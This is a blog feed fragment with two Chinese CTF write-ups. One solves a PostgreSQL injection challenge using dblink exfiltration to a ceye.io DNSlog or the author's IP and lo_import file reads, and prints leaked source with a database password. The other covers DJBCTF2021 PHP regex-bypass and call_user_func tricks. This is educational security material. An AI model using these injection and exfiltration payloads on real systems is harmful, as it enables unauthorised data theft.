--</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;HTTP_USER_AGENT¸­--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>好像没啥，根据 <code>hint：不是所有sql都叫PostgreSQL；flag在web目录下的某个文件里。</code> 确定，关键文件肯定在这里，于是继续尝试，读到了<code>.hatccess</code>，包含一下，再读一下</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>可疑文件<code>pushF1n4AnK</code>，读一下</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>至此题目结束了</p><p>最后说一下注入点的问题</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>对于DNSlog，注入点在host，即<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>，上面已解释过</p><h4 id="数据库外联"><a href="#数据库外联" class="headerlink" title="数据库外联"></a>数据库外联</h4><p>注入点在明文传输的部分，即<code>... user=&#39;|| (query) ||&#39;...</code>和<code>... dbname=&#39;||(query) &#39;</code>最后不需要<code>|</code>连接符，因为没有东西加了会报错</p><p>举例，例如在获取所有大对象oid时，在<code>user</code>处注，如图所示</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>即<code>user</code>和<code>dbname</code>处都是明文传输的都可以注，而password不行</p><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬的教导，感谢 @egg 师傅的指导，以及和 @R1chm0nd 师傅赛后讨论指正payload中<code>user=&#39; || (query) || &#39;</code>的<code>|</code>或符合其实是连接符，学习了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> la佬博客，希望能和师傅一样强，能和师傅换友链</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (写udf的，没用上2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>DJBCTF2021</title>
    <link href="https://err0r.top/article/djbctf2021/"/>
    <id>https://err0r.top/article/djbctf2021/</id>
    <published>2021-01-24T16:36:11.000Z</published>
    <updated>2021-03-30T11:51:42.085Z</updated>
    
    <content type="html"><![CDATA[<p>2021第一场比赛</p><p>昵称：别答了别答了再答人傻了</p><a id="more"></a><p>DJBctf，孩子太菜了呜呜呜</p><p>做了两道web，签到题有非预期(汗)，分析下预期和非预期解法，加上些个人的理解</p><p>本Web狗何德何能，尝试做了一道密码学…赛后才终于出了。</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Almost there."</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Input correct parameters"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Congratulations!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>有一个类，可能是反序列化，但看到最后<code>call_user_func</code>，类里面还有个static函数，应该是直接调用了。</p><p>看逻辑，<code>php://input</code>，变量<code>str</code>从POST原始流读取数据，过滤后变量覆盖。然后传入<code>shaw_root</code>，满足条件会给hint，最后<code>$ans===$SecretNumber</code>即可调用函数了。</p><hr><p>首先传<code>shaw_root</code>，第一个点在过滤了<code>_</code>，根据PHP特性，<code>空格</code>，<code>.</code>传递最后都会转变为<code>-</code></p><p>如图所示，此为web3的调试，与本题此考点一致</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>传入空格，<code>.</code>都变成了<code>_</code></p><p>接下来就是绕正则了，去regex101调了半天(没学正则的懒狗—–&gt;我)，调了一个payload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>传入得</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>写脚本爆破,脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/23 16:58@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>爆破得<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>传入成功</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>表明成功了，最后一步调用函数，根据PHP文档，类static函数可以直接用<code>class::static function</code>调用，详情见<a href="https://www.php.net/manual/zh/function.call-user-func.php">官方文档</a></p><p>最终payload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>这里要注意，如果用HackBar发包的话要换模式</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>因为转义是阻挡你前进步伐的一大元凶</p><h4 id="题目思考"><a href="#题目思考" class="headerlink" title="题目思考"></a>题目思考</h4><p>因为变量覆盖，直接把<code>SecretNumber</code>覆盖就行了，本题在<code>str</code>处有个过滤<code>e</code>，所以不行</p><p><code>php://input</code>读入原始流数据，所以取反异或转义之类的方法都是不行的</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Web签到题(大概)，源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token 